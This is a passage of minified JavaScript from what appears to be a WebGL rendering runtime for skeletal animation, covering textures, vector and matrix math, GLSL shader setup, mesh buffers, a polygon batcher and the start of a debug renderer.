e=this.context.gl;this.texture||(this.texture=this.context.gl.createTexture()),this.bind(),Gt.DISABLE_UNPACK_PREMULTIPLIED_ALPHA_WEBGL&&e.pixelStorei(e.UNPACK_PREMULTIPLY_ALPHA_WEBGL,!1),e.texImage2D(e.TEXTURE_2D,0,e.RGBA,e.RGBA,e.UNSIGNED_BYTE,this._image),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MAG_FILTER,e.LINEAR),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MIN_FILTER,t?e.LINEAR_MIPMAP_LINEAR:e.LINEAR),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_S,e.CLAMP_TO_EDGE),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_T,e.CLAMP_TO_EDGE),t&&e.generateMipmap(e.TEXTURE_2D)}restore(){this.texture=null,this.update(this.useMipMaps)}bind(t=0){let e=this.context.gl;this.boundUnit=t,e.activeTexture(e.TEXTURE0+t),e.bindTexture(e.TEXTURE_2D,this.texture)}unbind(){let t=this.context.gl;t.activeTexture(t.TEXTURE0+this.boundUnit),t.bindTexture(t.TEXTURE_2D,null)}dispose(){this.context.removeRestorable(this),this.context.gl.deleteTexture(this.texture)}}Gt.DISABLE_UNPACK_PREMULTIPLIED_ALPHA_WEBGL=!1;class Ht{constructor(t=0,e=0,s=0){this.x=0,this.y=0,this.z=0,this.x=t,this.y=e,this.z=s}setFrom(t){return this.x=t.x,this.y=t.y,this.z=t.z,this}set(t,e,s){return this.x=t,this.y=e,this.z=s,this}add(t){return this.x+=t.x,this.y+=t.y,this.z+=t.z,this}sub(t){return this.x-=t.x,this.y-=t.y,this.z-=t.z,this}scale(t){return this.x*=t,this.y*=t,this.z*=t,this}normalize(){let t=this.length();return 0==t||(t=1/t,this.x*=t,this.y*=t,this.z*=t),this}cross(t){return this.set(this.y*t.z-this.z*t.y,this.z*t.x-this.x*t.z,this.x*t.y-this.y*t.x)}multiply(t){let e=t.values;return this.set(this.x*e[Qt]+this.y*e[jt]+this.z*e[Jt]+e[Kt],this.x*e[Zt]+this.y*e[te]+this.z*e[ee]+e[se],this.x*e[ie]+this.y*e[re]+this.z*e[ne]+e[ae])}project(t){let e=t.values,s=1/(this.x*e[oe]+this.y*e[le]+this.z*e[he]+e[ce]);return this.set((this.x*e[Qt]+this.y*e[jt]+this.z*e[Jt]+e[Kt])*s,(this.x*e[Zt]+this.y*e[te]+this.z*e[ee]+e[se])*s,(this.x*e[ie]+this.y*e[re]+this.z*e[ne]+e[ae])*s)}dot(t){return this.x*t.x+this.y*t.y+this.z*t.z}length(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)}distance(t){let e=t.x-this.x,s=t.y-this.y,i=t.z-this.z;return Math.sqrt(e*e+s*s+i*i)}}const Qt=0,jt=4,Jt=8,Kt=12,Zt=1,te=5,ee=9,se=13,ie=2,re=6,ne=10,ae=14,oe=3,le=7,he=11,ce=15;class de{constructor(){this.temp=new Float32Array(16),this.values=new Float32Array(16);let t=this.values;t[Qt]=1,t[te]=1,t[ne]=1,t[ce]=1}set(t){return this.values.set(t),this}transpose(){let t=this.temp,e=this.values;return t[Qt]=e[Qt],t[jt]=e[Zt],t[Jt]=e[ie],t[Kt]=e[oe],t[Zt]=e[jt],t[te]=e[te],t[ee]=e[re],t[se]=e[le],t[ie]=e[Jt],t[re]=e[ee],t[ne]=e[ne],t[ae]=e[he],t[oe]=e[Kt],t[le]=e[se],t[he]=e[ae],t[ce]=e[ce],this.set(t)}identity(){let t=this.values;return t[Qt]=1,t[jt]=0,t[Jt]=0,t[Kt]=0,t[Zt]=0,t[te]=1,t[ee]=0,t[se]=0,t[ie]=0,t[re]=0,t[ne]=1,t[ae]=0,t[oe]=0,t[le]=0,t[he]=0,t[ce]=1,this}invert(){let t=this.values,e=this.temp,s=t[oe]*t[re]*t[ee]*t[Kt]-t[ie]*t[le]*t[ee]*t[Kt]-t[oe]*t[te]*t[ne]*t[Kt]+t[Zt]*t[le]*t[ne]*t[Kt]+t[ie]*t[te]*t[he]*t[Kt]-t[Zt]*t[re]*t[he]*t[Kt]-t[oe]*t[re]*t[Jt]*t[se]+t[ie]*t[le]*t[Jt]*t[se]+t[oe]*t[jt]*t[ne]*t[se]-t[Qt]*t[le]*t[ne]*t[se]-t[ie]*t[jt]*t[he]*t[se]+t[Qt]*t[re]*t[he]*t[se]+t[oe]*t[te]*t[Jt]*t[ae]-t[Zt]*t[le]*t[Jt]*t[ae]-t[oe]*t[jt]*t[ee]*t[ae]+t[Qt]*t[le]*t[ee]*t[ae]+t[Zt]*t[jt]*t[he]*t[ae]-t[Qt]*t[te]*t[he]*t[ae]-t[ie]*t[te]*t[Jt]*t[ce]+t[Zt]*t[re]*t[Jt]*t[ce]+t[ie]*t[jt]*t[ee]*t[ce]-t[Qt]*t[re]*t[ee]*t[ce]-t[Zt]*t[jt]*t[ne]*t[ce]+t[Qt]*t[te]*t[ne]*t[ce];if(0==s)throw new Error("non-invertible matrix");let i=1/s;return e[Qt]=t[ee]*t[ae]*t[le]-t[se]*t[ne]*t[le]+t[se]*t[re]*t[he]-t[te]*t[ae]*t[he]-t[ee]*t[re]*t[ce]+t[te]*t[ne]*t[ce],e[jt]=t[Kt]*t[ne]*t[le]-t[Jt]*t[ae]*t[le]-t[Kt]*t[re]*t[he]+t[jt]*t[ae]*t[he]+t[Jt]*t[re]*t[ce]-t[jt]*t[ne]*t[ce],e[Jt]=t[Jt]*t[se]*t[le]-t[Kt]*t[ee]*t[le]+t[Kt]*t[te]*t[he]-t[jt]*t[se]*t[he]-t[Jt]*t[te]*t[ce]+t[jt]*t[ee]*t[ce],e[Kt]=t[Kt]*t[ee]*t[re]-t[Jt]*t[se]*t[re]-t[Kt]*t[te]*t[ne]+t[jt]*t[se]*t[ne]+t[Jt]*t[te]*t[ae]-t[jt]*t[ee]*t[ae],e[Zt]=t[se]*t[ne]*t[oe]-t[ee]*t[ae]*t[oe]-t[se]*t[ie]*t[he]+t[Zt]*t[ae]*t[he]+t[ee]*t[ie]*t[ce]-t[Zt]*t[ne]*t[ce],e[te]=t[Jt]*t[ae]*t[oe]-t[Kt]*t[ne]*t[oe]+t[Kt]*t[ie]*t[he]-t[Qt]*t[ae]*t[he]-t[Jt]*t[ie]*t[ce]+t[Qt]*t[ne]*t[ce],e[ee]=t[Kt]*t[ee]*t[oe]-t[Jt]*t[se]*t[oe]-t[Kt]*t[Zt]*t[he]+t[Qt]*t[se]*t[he]+t[Jt]*t[Zt]*t[ce]-t[Qt]*t[ee]*t[ce],e[se]=t[Jt]*t[se]*t[ie]-t[Kt]*t[ee]*t[ie]+t[Kt]*t[Zt]*t[ne]-t[Qt]*t[se]*t[ne]-t[Jt]*t[Zt]*t[ae]+t[Qt]*t[ee]*t[ae],e[ie]=t[te]*t[ae]*t[oe]-t[se]*t[re]*t[oe]+t[se]*t[ie]*t[le]-t[Zt]*t[ae]*t[le]-t[te]*t[ie]*t[ce]+t[Zt]*t[re]*t[ce],e[re]=t[Kt]*t[re]*t[oe]-t[jt]*t[ae]*t[oe]-t[Kt]*t[ie]*t[le]+t[Qt]*t[ae]*t[le]+t[jt]*t[ie]*t[ce]-t[Qt]*t[re]*t[ce],e[ne]=t[jt]*t[se]*t[oe]-t[Kt]*t[te]*t[oe]+t[Kt]*t[Zt]*t[le]-t[Qt]*t[se]*t[le]-t[jt]*t[Zt]*t[ce]+t[Qt]*t[te]*t[ce],e[ae]=t[Kt]*t[te]*t[ie]-t[jt]*t[se]*t[ie]-t[Kt]*t[Zt]*t[re]+t[Qt]*t[se]*t[re]+t[jt]*t[Zt]*t[ae]-t[Qt]*t[te]*t[ae],e[oe]=t[ee]*t[re]*t[oe]-t[te]*t[ne]*t[oe]-t[ee]*t[ie]*t[le]+t[Zt]*t[ne]*t[le]+t[te]*t[ie]*t[he]-t[Zt]*t[re]*t[he],e[le]=t[jt]*t[ne]*t[oe]-t[Jt]*t[re]*t[oe]+t[Jt]*t[ie]*t[le]-t[Qt]*t[ne]*t[le]-t[jt]*t[ie]*t[he]+t[Qt]*t[re]*t[he],e[he]=t[Jt]*t[te]*t[oe]-t[jt]*t[ee]*t[oe]-t[Jt]*t[Zt]*t[le]+t[Qt]*t[ee]*t[le]+t[jt]*t[Zt]*t[he]-t[Qt]*t[te]*t[he],e[ce]=t[jt]*t[ee]*t[ie]-t[Jt]*t[te]*t[ie]+t[Jt]*t[Zt]*t[re]-t[Qt]*t[ee]*t[re]-t[jt]*t[Zt]*t[ne]+t[Qt]*t[te]*t[ne],t[Qt]=e[Qt]*i,t[jt]=e[jt]*i,t[Jt]=e[Jt]*i,t[Kt]=e[Kt]*i,t[Zt]=e[Zt]*i,t[te]=e[te]*i,t[ee]=e[ee]*i,t[se]=e[se]*i,t[ie]=e[ie]*i,t[re]=e[re]*i,t[ne]=e[ne]*i,t[ae]=e[ae]*i,t[oe]=e[oe]*i,t[le]=e[le]*i,t[he]=e[he]*i,t[ce]=e[ce]*i,this}determinant(){let t=this.values;return t[oe]*t[re]*t[ee]*t[Kt]-t[ie]*t[le]*t[ee]*t[Kt]-t[oe]*t[te]*t[ne]*t[Kt]+t[Zt]*t[le]*t[ne]*t[Kt]+t[ie]*t[te]*t[he]*t[Kt]-t[Zt]*t[re]*t[he]*t[Kt]-t[oe]*t[re]*t[Jt]*t[se]+t[ie]*t[le]*t[Jt]*t[se]+t[oe]*t[jt]*t[ne]*t[se]-t[Qt]*t[le]*t[ne]*t[se]-t[ie]*t[jt]*t[he]*t[se]+t[Qt]*t[re]*t[he]*t[se]+t[oe]*t[te]*t[Jt]*t[ae]-t[Zt]*t[le]*t[Jt]*t[ae]-t[oe]*t[jt]*t[ee]*t[ae]+t[Qt]*t[le]*t[ee]*t[ae]+t[Zt]*t[jt]*t[he]*t[ae]-t[Qt]*t[te]*t[he]*t[ae]-t[ie]*t[te]*t[Jt]*t[ce]+t[Zt]*t[re]*t[Jt]*t[ce]+t[ie]*t[jt]*t[ee]*t[ce]-t[Qt]*t[re]*t[ee]*t[ce]-t[Zt]*t[jt]*t[ne]*t[ce]+t[Qt]*t[te]*t[ne]*t[ce]}translate(t,e,s){let i=this.values;return i[Kt]+=t,i[se]+=e,i[ae]+=s,this}copy(){return(new de).set(this.values)}projection(t,e,s,i){this.identity();let r=1/Math.tan(s*(Math.PI/180)/2),n=(e+t)/(t-e),a=2*e*t/(t-e),o=this.values;return o[Qt]=r/i,o[Zt]=0,o[ie]=0,o[oe]=0,o[jt]=0,o[te]=r,o[re]=0,o[le]=0,o[Jt]=0,o[ee]=0,o[ne]=n,o[he]=-1,o[Kt]=0,o[se]=0,o[ae]=a,o[ce]=0,this}ortho2d(t,e,s,i){return this.ortho(t,t+s,e,e+i,0,1)}ortho(t,e,s,i,r,n){this.identity();let a=2/(e-t),o=2/(i-s),l=-2/(n-r),h=-(e+t)/(e-t),c=-(i+s)/(i-s),d=-(n+r)/(n-r),u=this.values;return u[Qt]=a,u[Zt]=0,u[ie]=0,u[oe]=0,u[jt]=0,u[te]=o,u[re]=0,u[le]=0,u[Jt]=0,u[ee]=0,u[ne]=l,u[he]=0,u[Kt]=h,u[se]=c,u[ae]=d,u[ce]=1,this}multiply(t){let e=this.temp,s=this.values,i=t.values;return e[Qt]=s[Qt]*i[Qt]+s[jt]*i[Zt]+s[Jt]*i[ie]+s[Kt]*i[oe],e[jt]=s[Qt]*i[jt]+s[jt]*i[te]+s[Jt]*i[re]+s[Kt]*i[le],e[Jt]=s[Qt]*i[Jt]+s[jt]*i[ee]+s[Jt]*i[ne]+s[Kt]*i[he],e[Kt]=s[Qt]*i[Kt]+s[jt]*i[se]+s[Jt]*i[ae]+s[Kt]*i[ce],e[Zt]=s[Zt]*i[Qt]+s[te]*i[Zt]+s[ee]*i[ie]+s[se]*i[oe],e[te]=s[Zt]*i[jt]+s[te]*i[te]+s[ee]*i[re]+s[se]*i[le],e[ee]=s[Zt]*i[Jt]+s[te]*i[ee]+s[ee]*i[ne]+s[se]*i[he],e[se]=s[Zt]*i[Kt]+s[te]*i[se]+s[ee]*i[ae]+s[se]*i[ce],e[ie]=s[ie]*i[Qt]+s[re]*i[Zt]+s[ne]*i[ie]+s[ae]*i[oe],e[re]=s[ie]*i[jt]+s[re]*i[te]+s[ne]*i[re]+s[ae]*i[le],e[ne]=s[ie]*i[Jt]+s[re]*i[ee]+s[ne]*i[ne]+s[ae]*i[he],e[ae]=s[ie]*i[Kt]+s[re]*i[se]+s[ne]*i[ae]+s[ae]*i[ce],e[oe]=s[oe]*i[Qt]+s[le]*i[Zt]+s[he]*i[ie]+s[ce]*i[oe],e[le]=s[oe]*i[jt]+s[le]*i[te]+s[he]*i[re]+s[ce]*i[le],e[he]=s[oe]*i[Jt]+s[le]*i[ee]+s[he]*i[ne]+s[ce]*i[he],e[ce]=s[oe]*i[Kt]+s[le]*i[se]+s[he]*i[ae]+s[ce]*i[ce],this.set(this.temp)}multiplyLeft(t){let e=this.temp,s=this.values,i=t.values;return e[Qt]=i[Qt]*s[Qt]+i[jt]*s[Zt]+i[Jt]*s[ie]+i[Kt]*s[oe],e[jt]=i[Qt]*s[jt]+i[jt]*s[te]+i[Jt]*s[re]+i[Kt]*s[le],e[Jt]=i[Qt]*s[Jt]+i[jt]*s[ee]+i[Jt]*s[ne]+i[Kt]*s[he],e[Kt]=i[Qt]*s[Kt]+i[jt]*s[se]+i[Jt]*s[ae]+i[Kt]*s[ce],e[Zt]=i[Zt]*s[Qt]+i[te]*s[Zt]+i[ee]*s[ie]+i[se]*s[oe],e[te]=i[Zt]*s[jt]+i[te]*s[te]+i[ee]*s[re]+i[se]*s[le],e[ee]=i[Zt]*s[Jt]+i[te]*s[ee]+i[ee]*s[ne]+i[se]*s[he],e[se]=i[Zt]*s[Kt]+i[te]*s[se]+i[ee]*s[ae]+i[se]*s[ce],e[ie]=i[ie]*s[Qt]+i[re]*s[Zt]+i[ne]*s[ie]+i[ae]*s[oe],e[re]=i[ie]*s[jt]+i[re]*s[te]+i[ne]*s[re]+i[ae]*s[le],e[ne]=i[ie]*s[Jt]+i[re]*s[ee]+i[ne]*s[ne]+i[ae]*s[he],e[ae]=i[ie]*s[Kt]+i[re]*s[se]+i[ne]*s[ae]+i[ae]*s[ce],e[oe]=i[oe]*s[Qt]+i[le]*s[Zt]+i[he]*s[ie]+i[ce]*s[oe],e[le]=i[oe]*s[jt]+i[le]*s[te]+i[he]*s[re]+i[ce]*s[le],e[he]=i[oe]*s[Jt]+i[le]*s[ee]+i[he]*s[ne]+i[ce]*s[he],e[ce]=i[oe]*s[Kt]+i[le]*s[se]+i[he]*s[ae]+i[ce]*s[ce],this.set(this.temp)}lookAt(t,e,s){let i=de.xAxis,r=de.yAxis,n=de.zAxis;n.setFrom(e).normalize(),i.setFrom(e).normalize(),i.cross(s).normalize(),r.setFrom(i).cross(n).normalize(),this.identity();let a=this.values;return a[Qt]=i.x,a[jt]=i.y,a[Jt]=i.z,a[Zt]=r.x,a[te]=r.y,a[ee]=r.z,a[ie]=-n.x,a[re]=-n.y,a[ne]=-n.z,de.tmpMatrix.identity(),de.tmpMatrix.values[Kt]=-t.x,de.tmpMatrix.values[se]=-t.y,de.tmpMatrix.values[ae]=-t.z,this.multiply(de.tmpMatrix),this}}de.xAxis=new Ht,de.yAxis=new Ht,de.zAxis=new Ht,de.tmpMatrix=new de;class ue{constructor(t,e,s){this.vertexShader=e,this.fragmentShader=s,this.vs=null,this.fs=null,this.program=null,this.tmp2x2=new Float32Array(4),this.tmp3x3=new Float32Array(9),this.tmp4x4=new Float32Array(16),this.vsSource=e,this.fsSource=s,this.context=t instanceof zt?t:new zt(t),this.context.addRestorable(this),this.compile()}getProgram(){return this.program}getVertexShader(){return this.vertexShader}getFragmentShader(){return this.fragmentShader}getVertexShaderSource(){return this.vsSource}getFragmentSource(){return this.fsSource}compile(){let t=this.context.gl;try{if(this.vs=this.compileShader(t.VERTEX_SHADER,this.vertexShader),!this.vs)throw new Error("Couldn't compile vertex shader.");if(this.fs=this.compileShader(t.FRAGMENT_SHADER,this.fragmentShader),!this.fs)throw new Error("Couldn#t compile fragment shader.");this.program=this.compileProgram(this.vs,this.fs)}catch(t){throw this.dispose(),t}}compileShader(t,e){let s=this.context.gl,i=s.createShader(t);if(!i)throw new Error("Couldn't create shader.");if(s.shaderSource(i,e),s.compileShader(i),!s.getShaderParameter(i,s.COMPILE_STATUS)){let t="Couldn't compile shader: "+s.getShaderInfoLog(i);if(s.deleteShader(i),!s.isContextLost())throw new Error(t)}return i}compileProgram(t,e){let s=this.context.gl,i=s.createProgram();if(!i)throw new Error("Couldn't compile program.");if(s.attachShader(i,t),s.attachShader(i,e),s.linkProgram(i),!s.getProgramParameter(i,s.LINK_STATUS)){let t="Couldn't compile shader program: "+s.getProgramInfoLog(i);if(s.deleteProgram(i),!s.isContextLost())throw new Error(t)}return i}restore(){this.compile()}bind(){this.context.gl.useProgram(this.program)}unbind(){this.context.gl.useProgram(null)}setUniformi(t,e){this.context.gl.uniform1i(this.getUniformLocation(t),e)}setUniformf(t,e){this.context.gl.uniform1f(this.getUniformLocation(t),e)}setUniform2f(t,e,s){this.context.gl.uniform2f(this.getUniformLocation(t),e,s)}setUniform3f(t,e,s,i){this.context.gl.uniform3f(this.getUniformLocation(t),e,s,i)}setUniform4f(t,e,s,i,r){this.context.gl.uniform4f(this.getUniformLocation(t),e,s,i,r)}setUniform2x2f(t,e){let s=this.context.gl;this.tmp2x2.set(e),s.uniformMatrix2fv(this.getUniformLocation(t),!1,this.tmp2x2)}setUniform3x3f(t,e){let s=this.context.gl;this.tmp3x3.set(e),s.uniformMatrix3fv(this.getUniformLocation(t),!1,this.tmp3x3)}setUniform4x4f(t,e){let s=this.context.gl;this.tmp4x4.set(e),s.uniformMatrix4fv(this.getUniformLocation(t),!1,this.tmp4x4)}getUniformLocation(t){let e=this.context.gl;if(!this.program)throw new Error("Shader not compiled.");let s=e.getUniformLocation(this.program,t);if(!s&&!e.isContextLost())throw new Error(`Couldn't find location for uniform ${t}`);return s}getAttributeLocation(t){let e=this.context.gl;if(!this.program)throw new Error("Shader not compiled.");let s=e.getAttribLocation(this.program,t);if(-1==s&&!e.isContextLost())throw new Error(`Couldn't find location for attribute ${t}`);return s}dispose(){this.context.removeRestorable(this);let t=this.context.gl;this.vs&&(t.deleteShader(this.vs),this.vs=null),this.fs&&(t.deleteShader(this.fs),this.fs=null),this.program&&(t.deleteProgram(this.program),this.program=null)}static newColoredTextured(t){let e=`\n\t\t\t\tattribute vec4 ${ue.POSITION};\n\t\t\t\tattribute vec4 ${ue.COLOR};\n\t\t\t\tattribute vec2 ${ue.TEXCOORDS};\n\t\t\t\tuniform mat4 ${ue.MVP_MATRIX};\n\t\t\t\tvarying vec4 v_color;\n\t\t\t\tvarying vec2 v_texCoords;\n\n\t\t\t\tvoid main () {\n\t\t\t\t\tv_color = ${ue.COLOR};\n\t\t\t\t\tv_texCoords = ${ue.TEXCOORDS};\n\t\t\t\t\tgl_Position = ${ue.MVP_MATRIX} * ${ue.POSITION};\n\t\t\t\t}\n\t\t\t`;return new ue(t,e,"\n\t\t\t\t#ifdef GL_ES\n\t\t\t\t\t#define LOWP lowp\n\t\t\t\t\tprecision mediump float;\n\t\t\t\t#else\n\t\t\t\t\t#define LOWP\n\t\t\t\t#endif\n\t\t\t\tvarying LOWP vec4 v_color;\n\t\t\t\tvarying vec2 v_texCoords;\n\t\t\t\tuniform sampler2D u_texture;\n\n\t\t\t\tvoid main () {\n\t\t\t\t\tgl_FragColor = v_color * texture2D(u_texture, v_texCoords);\n\t\t\t\t}\n\t\t\t")}static newTwoColoredTextured(t){let e=`\n\t\t\t\tattribute vec4 ${ue.POSITION};\n\t\t\t\tattribute vec4 ${ue.COLOR};\n\t\t\t\tattribute vec4 ${ue.COLOR2};\n\t\t\t\tattribute vec2 ${ue.TEXCOORDS};\n\t\t\t\tuniform mat4 ${ue.MVP_MATRIX};\n\t\t\t\tvarying vec4 v_light;\n\t\t\t\tvarying vec4 v_dark;\n\t\t\t\tvarying vec2 v_texCoords;\n\n\t\t\t\tvoid main () {\n\t\t\t\t\tv_light = ${ue.COLOR};\n\t\t\t\t\tv_dark = ${ue.COLOR2};\n\t\t\t\t\tv_texCoords = ${ue.TEXCOORDS};\n\t\t\t\t\tgl_Position = ${ue.MVP_MATRIX} * ${ue.POSITION};\n\t\t\t\t}\n\t\t\t`;return new ue(t,e,"\n\t\t\t\t#ifdef GL_ES\n\t\t\t\t\t#define LOWP lowp\n\t\t\t\t\tprecision mediump float;\n\t\t\t\t#else\n\t\t\t\t\t#define LOWP\n\t\t\t\t#endif\n\t\t\t\tvarying LOWP vec4 v_light;\n\t\t\t\tvarying LOWP vec4 v_dark;\n\t\t\t\tvarying vec2 v_texCoords;\n\t\t\t\tuniform sampler2D u_texture;\n\n\t\t\t\tvoid main () {\n\t\t\t\t\tvec4 texColor = texture2D(u_texture, v_texCoords);\n\t\t\t\t\tgl_FragColor.a = texColor.a * v_light.a;\n\t\t\t\t\tgl_FragColor.rgb = ((texColor.a - 1.0) * v_dark.a + 1.0 - texColor.rgb) * v_dark.rgb + texColor.rgb * v_light.rgb;\n\t\t\t\t}\n\t\t\t")}static newColored(t){let e=`\n\t\t\t\tattribute vec4 ${ue.POSITION};\n\t\t\t\tattribute vec4 ${ue.COLOR};\n\t\t\t\tuniform mat4 ${ue.MVP_MATRIX};\n\t\t\t\tvarying vec4 v_color;\n\n\t\t\t\tvoid main () {\n\t\t\t\t\tv_color = ${ue.COLOR};\n\t\t\t\t\tgl_Position = ${ue.MVP_MATRIX} * ${ue.POSITION};\n\t\t\t\t}\n\t\t\t`;return new ue(t,e,"\n\t\t\t\t#ifdef GL_ES\n\t\t\t\t\t#define LOWP lowp\n\t\t\t\t\tprecision mediump float;\n\t\t\t\t#else\n\t\t\t\t\t#define LOWP\n\t\t\t\t#endif\n\t\t\t\tvarying LOWP vec4 v_color;\n\n\t\t\t\tvoid main () {\n\t\t\t\t\tgl_FragColor = v_color;\n\t\t\t\t}\n\t\t\t")}}ue.MVP_MATRIX="u_projTrans",ue.POSITION="a_position",ue.COLOR="a_color",ue.COLOR2="a_color2",ue.TEXCOORDS="a_texCoords",ue.SAMPLER="u_texture";class me{constructor(t,e,s,i){this.attributes=e,this.verticesBuffer=null,this.verticesLength=0,this.dirtyVertices=!1,this.indicesBuffer=null,this.indicesLength=0,this.dirtyIndices=!1,this.elementsPerVertex=0,this.context=t instanceof zt?t:new zt(t),this.elementsPerVertex=0;for(let t=0;t<e.length;t++)this.elementsPerVertex+=e[t].numElements;this.vertices=new Float32Array(s*this.elementsPerVertex),this.indices=new Uint16Array(i),this.context.addRestorable(this)}getAttributes(){return this.attributes}maxVertices(){return this.vertices.length/this.elementsPerVertex}numVertices(){return this.verticesLength/this.elementsPerVertex}setVerticesLength(t){this.dirtyVertices=!0,this.verticesLength=t}getVertices(){return this.vertices}maxIndices(){return this.indices.length}numIndices(){return this.indicesLength}setIndicesLength(t){this.dirtyIndices=!0,this.indicesLength=t}getIndices(){return this.indices}getVertexSizeInFloats(){let t=0;for(var e=0;e<this.attributes.length;e++)t+=this.attributes[e].numElements;return t}setVertices(t){if(this.dirtyVertices=!0,t.length>this.vertices.length)throw Error("Mesh can't store more than "+this.maxVertices()+" vertices");this.vertices.set(t,0),this.verticesLength=t.length}setIndices(t){if(this.dirtyIndices=!0,t.length>this.indices.length)throw Error("Mesh can't store more than "+this.maxIndices()+" indices");this.indices.set(t,0),this.indicesLength=t.length}draw(t,e){this.drawWithOffset(t,e,0,this.indicesLength>0?this.indicesLength:this.verticesLength/this.elementsPerVertex)}drawWithOffset(t,e,s,i){let r=this.context.gl;(this.dirtyVertices||this.dirtyIndices)&&this.update(),this.bind(t),this.indicesLength>0?r.drawElements(e,i,r.UNSIGNED_SHORT,2*s):r.drawArrays(e,s,i),this.unbind(t)}bind(t){let e=this.context.gl;e.bindBuffer(e.ARRAY_BUFFER,this.verticesBuffer);let s=0;for(let i=0;i<this.attributes.length;i++){let r=this.attributes[i],n=t.getAttributeLocation(r.name);e.enableVertexAttribArray(n),e.vertexAttribPointer(n,r.numElements,e.FLOAT,!1,4*this.elementsPerVertex,4*s),s+=r.numElements}this.indicesLength>0&&e.bindBuffer(e.ELEMENT_ARRAY_BUFFER,this.indicesBuffer)}unbind(t){let e=this.context.gl;for(let s=0;s<this.attributes.length;s++){let i=this.attributes[s],r=t.getAttributeLocation(i.name);e.disableVertexAttribArray(r)}e.bindBuffer(e.ARRAY_BUFFER,null),this.indicesLength>0&&e.bindBuffer(e.ELEMENT_ARRAY_BUFFER,null)}update(){let t=this.context.gl;this.dirtyVertices&&(this.verticesBuffer||(this.verticesBuffer=t.createBuffer()),t.bindBuffer(t.ARRAY_BUFFER,this.verticesBuffer),t.bufferData(t.ARRAY_BUFFER,this.vertices.subarray(0,this.verticesLength),t.DYNAMIC_DRAW),this.dirtyVertices=!1),this.dirtyIndices&&(this.indicesBuffer||(this.indicesBuffer=t.createBuffer()),t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,this.indicesBuffer),t.bufferData(t.ELEMENT_ARRAY_BUFFER,this.indices.subarray(0,this.indicesLength),t.DYNAMIC_DRAW),this.dirtyIndices=!1)}restore(){this.verticesBuffer=null,this.indicesBuffer=null,this.update()}dispose(){this.context.removeRestorable(this);let t=this.context.gl;t.deleteBuffer(this.verticesBuffer),t.deleteBuffer(this.indicesBuffer)}}class fe{constructor(t,e,s){this.name=t,this.type=e,this.numElements=s}}class ge extends fe{constructor(){super(ue.POSITION,e.wY.Float,2)}}class pe extends fe{constructor(t=0){super(ue.TEXCOORDS+(0==t?"":t),e.wY.Float,2)}}class be extends fe{constructor(){super(ue.COLOR,e.wY.Float,4)}}class xe extends fe{constructor(){super(ue.COLOR2,e.wY.Float,4)}}var we,ye;e.wY=void 0,(we=e.wY||(e.wY={}))[we.Float=0]="Float";class ve{constructor(t,e=!0,s=10920){if(this.drawCalls=0,this.isDrawing=!1,this.shader=null,this.lastTexture=null,this.verticesLength=0,this.indicesLength=0,this.cullWasEnabled=!1,s>10920)throw new Error("Can't have more than 10920 triangles per batch: "+s);this.context=t instanceof zt?t:new zt(t);let i=e?[new ge,new be,new pe,new xe]:[new ge,new be,new pe];this.mesh=new me(t,i,s,3*s);let r=this.context.gl;this.srcColorBlend=r.SRC_ALPHA,this.srcAlphaBlend=r.ONE,this.dstBlend=r.ONE_MINUS_SRC_ALPHA}begin(t){if(this.isDrawing)throw new Error("PolygonBatch is already drawing. Call PolygonBatch.end() before calling PolygonBatch.begin()");this.drawCalls=0,this.shader=t,this.lastTexture=null,this.isDrawing=!0;let e=this.context.gl;e.enable(e.BLEND),e.blendFuncSeparate(this.srcColorBlend,this.dstBlend,this.srcAlphaBlend,this.dstBlend),this.cullWasEnabled=e.isEnabled(e.CULL_FACE),this.cullWasEnabled&&e.disable(e.CULL_FACE)}setBlendMode(t,e,s){this.srcColorBlend==t&&this.srcAlphaBlend==e&&this.dstBlend==s||(this.srcColorBlend=t,this.srcAlphaBlend=e,this.dstBlend=s,!this.isDrawing)||(this.flush(),this.context.gl.blendFuncSeparate(t,s,e,s))}draw(t,e,s){t!=this.lastTexture?(this.flush(),this.lastTexture=t):(this.verticesLength+e.length>this.mesh.getVertices().length||this.indicesLength+s.length>this.mesh.getIndices().length)&&this.flush();let i=this.mesh.numVertices();this.mesh.getVertices().set(e,this.verticesLength),this.verticesLength+=e.length,this.mesh.setVerticesLength(this.verticesLength);let r=this.mesh.getIndices();for(let t=this.indicesLength,e=0;e<s.length;t++,e++)r[t]=s[e]+i;this.indicesLength+=s.length,this.mesh.setIndicesLength(this.indicesLength)}flush(){if(0!=this.verticesLength){if(!this.lastTexture)throw new Error("No texture set.");if(!this.shader)throw new Error("No shader set.");this.lastTexture.bind(),this.mesh.draw(this.shader,this.context.gl.TRIANGLES),this.verticesLength=0,this.indicesLength=0,this.mesh.setVerticesLength(0),this.mesh.setIndicesLength(0),this.drawCalls++}}end(){if(!this.isDrawing)throw new Error("PolygonBatch is not drawing. Call PolygonBatch.begin() before calling PolygonBatch.end()");(this.verticesLength>0||this.indicesLength>0)&&this.flush(),this.shader=null,this.lastTexture=null,this.isDrawing=!1;let t=this.context.gl;t.disable(t.BLEND),this.cullWasEnabled&&t.enable(t.CULL_FACE)}getDrawCalls(){return this.drawCalls}dispose(){this.mesh.dispose()}}e.DY=void 0,(ye=e.DY||(e.DY={}))[ye.Point=0]="Point",ye[ye.Line=1]="Line",ye[ye.Filled=4]="Filled";class Ae{constructor(t){this.boneLineColor=new r(1,0,0,1),this.boneOriginColor=new r(0,1,0,1),this.attachmentLineColor=new r(0,0,1,.5),this.triangleLineColor=new r(1,.64,0,.5),this.pathColor=(new r).setFromString("FF7F00"),this.clipColor=new r(.8,0,0,2),this.aabbColor=new r(0,1,0,.5),this.drawBones=!0,this.drawRegionAttachments=!0,this.drawBoundingBoxes=!0,this.drawMeshHull=!0,this.drawMeshTriangles=!0,this.drawPaths=!0,this.drawSkeletonXY=!1,this.drawClipping=!0,this.premultipliedAlpha=!1,this.scale=1,this.boneWidth=2,this.bounds=new Dt,this.temp=new Array,this.vertices=a.newFloatArray(2048),this.context=t instanceof zt?t:new zt(t)}draw(t,e,s){let i=e.x,r=e.y,n=this.context.gl,o=this.premultipliedAlpha?n.ONE:n.SRC_ALPHA;t.setBlendMode(o,n.ONE,n.ONE_MINUS_SRC_ALPHA);let l=e.bones;if(this.drawBones){t.setColor(this.boneLineColor);for(let e=0,i=l.length;e<i;e++){let 